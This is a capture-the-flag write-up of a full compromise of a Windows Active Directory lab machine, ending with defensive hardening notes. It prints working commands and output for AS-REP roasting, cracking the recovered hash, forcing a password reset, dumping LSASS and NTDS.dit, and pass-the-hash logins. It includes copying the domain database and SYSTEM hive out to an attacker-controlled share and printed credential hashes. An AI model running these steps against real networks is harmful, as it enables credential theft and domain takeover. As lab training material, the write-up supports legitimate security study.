                                                                BLACKFIELD

<img width="1536" height="1024" alt="5325327" src="https://github.com/user-attachments/assets/1ae8ab62-ef76-4b27-bd70-ad000f1cb450" />

> **Difficulty:** Hard<br>
> **OS:** Windows<br>
> **Write-up by:** Butlipan

## 🔍 Enumeration

Let’s start our journey by performing enumeration with an Nmap scan.
```
sudo nmap -sS -A -p- 10.129.43.83
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-16 07:13 CST
Nmap scan report for 10.129.43.83
Host is up (0.0077s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-16 20:16:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2026-01-16T20:16:46
|_  start_date: N/A
```
As you see, this machine is in AD environment, my favorite! From result you can read a few things: 
- **Domain: BLACKFIELD.local**
- **Active SMB**
- **Active WinRM**

It gives us some vectors of potential attack.
Let's move on to some AD enumeration.

## 🔍 Initial AD Enumeration

In this type of machines I like to leave the [Kerbrute](https://github.com/ropnop/kerbrute?tab=readme-ov-file) running in the background, it can gives some knowledge of potential users on machine (In real environments this should be done carefully due to potential Kerberos event noise)
```
$ chmod +x kerbrute
$ ./kerbrute userenum -d BLACKFIELD.local0 --dc 10.129.43.83 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```
Meanwhile, we can check SMB, maybe there's a null session which will propably open a few doors for us
```
$ smbmap -H 10.129.43.83 -u guest -p ""
[+] IP: 10.129.43.83:445	Name: 10.129.43.83                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	profiles$                                         	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share
```
Jackpot! Now we're going to dig deeper
```
$ smbclient //10.129.43.83/profiles$ -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 11:47:12 2020
  ..                                  D        0  Wed Jun  3 11:47:12 2020
<snip>
  ASischo                             D        0  Wed Jun  3 11:47:11 2020
  ASpruce                             D        0  Wed Jun  3 11:47:11 2020
  ATakach                             D        0  Wed Jun  3 11:47:11 2020
  ATaueg                              D        0  Wed Jun  3 11:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 11:47:11 2020
  audit2020                           D        0  Wed Jun  3 11:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 11:47:11 2020
  AWorsey                             D        0  Wed Jun  3 11:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 11:47:11 2020
  BBakajza                            D        0  Wed Jun  3 11:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 11:47:11 2020
<snip>
  SReppond                            D        0  Wed Jun  3 11:47:12 2020
  SSicliano                           D        0  Wed Jun  3 11:47:12 2020
  SSilex                              D        0  Wed Jun  3 11:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 11:47:12 2020
  STousignaut                         D        0  Wed Jun  3 11:47:12 2020
  support                             D        0  Wed Jun  3 11:47:12 2020
  svc_backup                          D        0  Wed Jun  3 11:47:12 2020
  SWhyte                              D        0  Wed Jun  3 11:47:12 2020
  SWynigear                           D        0  Wed Jun  3 11:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 11:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 11:47:12 2020
<snip>
```
I didn't find anything useful.. but this? I see opportunity here. It looks innocent, but it gives us usernames for our wordlist, also you can see:
- **support**
- **audit2020**
- **svc_backup**

Those accounts looks very high-value
In the meantime, the kerbrute found some accounts, let's see them
```
$ ./kerbrute userenum -d blackfield.local --dc 10.129.43.83 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/16/26 - Ronnie Flathers @ropnop

2026/01/16 07:33:11 >  Using KDC(s):
2026/01/16 07:33:11 >  	10.129.43.83:88

2026/01/16 07:36:31 >  [+] VALID USERNAME:	 support@blackfield.local
2026/01/16 07:38:10 >  [+] VALID USERNAME:	 guest@blackfield.local
2026/01/16 07:49:10 >  [+] VALID USERNAME:	 administrator@blackfield.local
```
Now, we can change our wordlist with updated one
```
$ ./kerbrute userenum -d blackfield.local --dc 10.129.43.83 user.list

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/16/26 - Ronnie Flathers @ropnop

2026/01/16 09:24:45 >  Using KDC(s):
2026/01/16 09:24:45 >  	10.129.43.83:88

2026/01/16 09:24:51 >  [+] VALID USERNAME:	 administrator@blackfield.local
2026/01/16 09:24:51 >  [+] VALID USERNAME:	 audit2020@blackfield.local
2026/01/16 09:24:51 >  [+] VALID USERNAME:	 svc_backup@blackfield.local
2026/01/16 09:24:51 >  [+] VALID USERNAME:	 guest@blackfield.local
2026/01/16 09:24:51 >  [+] VALID USERNAME:	 support@blackfield.local
2026/01/16 09:24:51 >  Done! Tested 5 usernames (5 valid) in 5.017 seconds
```
Okay, that's good omen. With that we can try some AS-REP roasting

## 💥AS-REP roasting

```
$ GetNPUsers.py -dc-ip 10.129.43.83 -no-pass -usersfile user.list blackfield/
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD:51b0b66c1db5170a57d3135ef6e41f7f$29519e6febce505e498a541accc6b02f7719851d2b93fcf044d66af1016bdfdc3c99e1c7251f5e55005dc9af07fb66290da3d80ba38dceb4fabf679976184cbbc92210f067534becad83d93060661cea796f162c25ed1a6e206f2b2b4200aecbfd0ed3ad98dc5d026f93ab9ce3f488bdc8af67a3df1cffc6e42a0894481a73922884263deb1a1aa43ff9e8e8940c40989e1f6bcf0aa4bb7891e4fab51151ed9a8d06b64a717c8e6eb8c9bd53b67b0d2e239ab6f9027007bf41c13927e5c417a3d884e792572f8cf115d2529cdcc7a56d68b5475cf5b4a507153c66c5b108dd3cde59803ca00cb6d944ba7ba32891
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Hit, sunk! Now, with the [hashcat](https://hashcat.net/hashcat/) we can try to crack it
```
hashcat -m 18200 hash_to_crack rockyou.tx
```
```
<snip>
ad83d93060661cea796f162c25ed1a6e206f2b2b4200aecbfd0ed3ad98dc5d026f93ab9ce3f488bdc8af67a3df1cffc6e42a0894481a73922884263deb1a1aa43ff9e8e8940c40989e1f6bcf0aa4bb7891e4fab51151ed9a8d06b64a717c8e6eb8c9bd53b67b0d2e239ab6f9027007bf41c13927e5c417a3d884e792572f8cf115d2529cdcc7a56d68b5475cf5b4a507153c66c5b108dd3cde59803ca00cb6d944ba7ba32891:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD:51b0b66c1db5170a57...a32891
Time.Started.....: Fri Jan 16 10:21:51 2026 (10 secs)
Time.Estimated...: Fri Jan 16 10:22:01 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1465.1 kH/s (1.18ms) @ Accel:512 Loops:1 Thr:1 Vec:8
<snip>
```
```
#00^BlackKnight
```
With those creds. we now have more vectores to attack. Firt, I tried a Evil-WinRm, but it didn't work, so i tried returimg back to SMB, a i found this
```
$ smbmap -H 10.129.43.83 -u support -p '#00^BlackKnight'
[+] IP: 10.129.43.83:445	Name: 10.129.43.83                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	profiles$                                         	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
  ```
We're in! Let's dig even more there<br>
```
AFTER A WHILE
```
Unfortunately, there is nothing that would allow us to progress. The last thing that came to mind was [bloodhound.py](https://github.com/dirkjanm/BloodHound.py). Maybe this will at least give us some insight into what's going on in the domain and whether there's anything our user can do.

## 🐕 BloodHound

```
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.43.83 -c DcOnly
```
<img width="1155" height="930" alt="obraz" src="https://github.com/user-attachments/assets/7ecc3c57-f852-4023-a3b4-65eab52d1b73" />

It's very interesting find, aparently our user can force password changing without knowing previous one. This is possible because the support account has the ForceChangePassword extended right on the audit2020 object. Let's find out how to do that

```
Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.

net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

## 👟 Getting the Foothold

Okay, now I can replicate it
```
net rpc password "audit2020" "newP@ssword2022" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "10.129.43.83"
```
Let's check if it works
```
$ smbmap -H 10.129.43.83 -u audit2020 -p newP@ssword2022
[+] IP: 10.129.43.83:445	Name: 10.129.43.83                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	profiles$                                         	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
```
Nice, new share is active for us. I'm going to investigate what's hiding in there
```
$ smbmap -H 10.129.43.83 -u audit2020 -p newP@ssword2022 -R --exclude SYSVOL profiles$ NETLOGON IPC$
<snip>
	fr--r--r--         24962333 Thu May 28 15:29:24 2020	ctfmon.zip
	fr--r--r--         23993305 Thu May 28 15:29:24 2020	dfsrs.zip
	fr--r--r--         18366396 Thu May 28 15:29:24 2020	dllhost.zip
	fr--r--r--          8810157 Thu May 28 15:29:24 2020	ismserv.zip
	fr--r--r--         41936098 Thu May 28 15:29:24 2020	lsass.zip
	fr--r--r--         64288607 Thu May 28 15:29:24 2020	mmc.zip
	fr--r--r--         13332174 Thu May 28 15:29:24 2020	RuntimeBroker.zip
	fr--r--r--        131983313 Thu May 28 15:29:24 2020	ServerManager.zip
	fr--r--r--         33141744 Thu May 28 15:29:24 2020	sihost.zip
<snip>
```
You see it? Lsass.zip, it's our gold mine! Using [pypykatz](https://github.com/skelsec/pypykatz) I can get some important hash'es from this file
```
$ smbmap -H 10.129.43.83 -u audit2020 -p newP@ssword2022 --download "forensic\memory_analysis\lsass.zip"
$ unzip lsass.zip
$ pypykatz lsa minidump lsass.DMP
<snip>
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
<snip>
```
Excellent news, we have NT for user with remote rights! Thanks to this knowledge we can utilize [PtH](https://en.wikipedia.org/wiki/Pass_the_hash) technic
```
$ evil-winrm -i 10.129.43.83 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

## Windows Privilege Escalation 😈

First, I'm going to check my priv. as svc_backup
```
*Evil-WinRM* PS C:\Users\svc_backup> whoami /all
<snip>
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------
<snip>
```
Okey, SeBackupPrivilege allows reading protected files regardless of ACLs, which makes it extremely dangerous when assigned to non-admin users. For this walkthroug i picked it as our main vector to exploit<br>
I used this [repo.](https://k4sth4.github.io/SeBackupPrivilege/) for this job. 
- **First step**<br>
We need few .dll. You can find them in [k4sth4 repo.](https://github.com/k4sth4/SeBackupPrivilege)<br>
After that we need to upload and import them on target host
```
[Attack host]
$ python3 -m http.server

[Victim host]
*Evil-WinRM* PS C:\Users\svc_backup> Invoke-WebRequest -Uri "http://10.10.14.229:8000/SeBackupPrivilegeCmdLets.dll" -OutFile SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup> Invoke-WebRequest -Uri "http://10.10.14.229:8000/SeBackupPrivilegeUtils.dll" -OutFile SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup> import-module .\SeBackupPrivilegeUtils.dll
```
- **Second step**<br>
We must create a vss.dsh file, change file format and upload it on victim host.

<img width="2096" height="191" alt="obraz" src="https://github.com/user-attachments/assets/9152ad7e-a41d-42c0-8b0b-7663b04dd953" />

```
[Attack host]
$ unix2dos vss.dsh

[Victim host]
*Evil-WinRM* PS C:\Users\svc_backup> Invoke-WebRequest -Uri "http://10.10.14.229:8000/vss.dsh" -OutFile 'C:\programdata\vss.dsh'
```
- **Thrid step**<br>
Use diskshadow to explore the func of copy and after that download ntds.dit | SYSTEM hive on our attack host for dumping
```
[Victim host]
*Evil-WinRM* PS C:\Windows\NTDS> diskshadow /s c:\\programdata\\vss.dsh
*Evil-WinRM* PS C:\Windows\NTDS> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit

[Attack host]
$ smbserver.py butlipan . -smb2support -username WIN -password WIN

[Victim host]
*Evil-WinRM* PS C:\Windows\NTDS> net use \\10.10.14.229\butlipan /u:WIN WIN
The command completed successfully.
*Evil-WinRM* PS C:\Windows\NTDS> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit \\10.10.14.229\butlipan\ntds.dit
*Evil-WinRM* PS C:\Windows\NTDS> reg.exe save hklm\system \\10.10.14.229\butlipan\system
The operation completed successfully.
```
- **Last step**<br>
Extracting hashes from ntds.dit
```
[Attack host]
$ secretsdump.py -ntds ntds.dit -system system LOCAL
<snip>
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0d455be29fb68358fcd028554ea66679:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
<snip>
```
Beautiful view! Now, let's utilize PtH and we can log into the admin account!
```
$ evil-winrm -i 10.129.43.83 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```
Pwned!!!

## 🏁 Administrator and User flags

Now, claim your rewards, flags :)
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd \Users
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/5/2020   8:40 PM                Administrator
d-r---         2/1/2020  11:05 AM                Public
d-----        1/16/2026   9:11 PM                svc_backup


*Evil-WinRM* PS C:\Users> cd svc_backup
*Evil-WinRM* PS C:\Users\svc_backup> cd Desktop 
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
```
## 🛡️ Active Directory Hardening Notes

The compromise of the domain was possible due to several Active Directory misconfigurations and weak security controls:<br>
- **Kerberos pre-authentication was disabled for at least one user account, making it vulnerable to AS-REP roasting and offline password cracking**
- **Anonymous or low-privileged SMB access exposed user profile directories, enabling user enumeration without valid credentials**
- **Insecure Active Directory ACLs allowed a low-privileged account to force password changes on another user without knowing the previous password**
- **Service account credentials were present in LSASS memory dumps, allowing credential extraction and lateral movement**
- **Dangerous privileges such as SeBackupPrivilege and SeRestorePrivilege were assigned to a non-administrative service account**
- **Insufficient protection of domain controller files allowed attackers to extract NTDS.dit and the SYSTEM hive, resulting in full domain compromise**
- **Lack of monitoring and alerting allowed Kerberos abuse, password resets, credential dumping, and backup operations to go undetected**

Recommended mitigations:<br>
- **Enforce Kerberos pre-authentication for all user and service accounts and routinely audit for AS-REP roastable users**
- **Disable anonymous SMB enumeration and restrict access to shares such as profiles$, IPC$, SYSVOL, and NETLOGON to the minimum required**
- **Review and harden Active Directory ACLs, especially permissions like ForceChangePassword, GenericAll, and GenericWrite**
- **Protect LSASS by enabling Credential Guard, disabling WDigest, and blocking unauthorized access to memory dumps**
- **Remove SeBackupPrivilege and SeRestorePrivilege from non-administrative accounts and use Just Enough Administration (JEA) for backup tasks**
- **Restrict WinRM and SMB access to Domain Controllers and limit access to trusted administrative groups only**













